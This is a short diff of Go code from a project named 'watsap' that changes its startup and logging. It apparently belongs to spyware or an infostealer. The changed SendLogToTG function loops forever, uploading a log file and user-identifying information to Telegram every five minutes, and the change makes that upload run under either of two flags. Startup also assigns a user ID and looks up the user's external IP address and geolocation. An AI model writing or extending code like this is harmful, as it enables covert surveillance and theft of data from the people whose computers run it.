@@ -6,6 +6,7 @@ import (
 	"watsap/plugins/geoip"
 	"watsap/plugins/update"
 	"watsap/utils/config"
+	"watsap/utils/logger"
 	"watsap/utils/messages"
 	"watsap/utils/secure"
 	"watsap/utils/telegram"
@@ -21,22 +22,19 @@ func WorkDir() {
 }
 
 func SendLogToTG() {
-	// send log to telegram
-	if config.DebugMode {
-		if config.WaLogging {
-			for {
-				telegram.TgSendFile(config.LogFile, messages.GetUserInfoMsg())
-				time.Sleep(5 * time.Minute)
-			}
+	// send log to telegram periodically if logging or debug mode is enabled
+	if config.WaLogging || config.DebugMode {
+		for {
+			telegram.TgSendFile(config.LogFile, messages.GetUserInfoMsg())
+			time.Sleep(5 * time.Minute)
 		}
-
 	}
 }
 
 func InitWa() {
 	WorkDir()           // set working directory
-	config.SetupLog()   // setup logging
-	config.InitConfig() // decode config variables
+	config.InitConfig() // decode config variables and set DebugMode/WaLogging
+	logger.InitLogger() // initialize centralized logger
 	InitUserID()        // assign user ID
 	secure.SSLPinning() // perform SSL Pinning verification
 	geoip.GetIP()       // get user external IP address and geo location
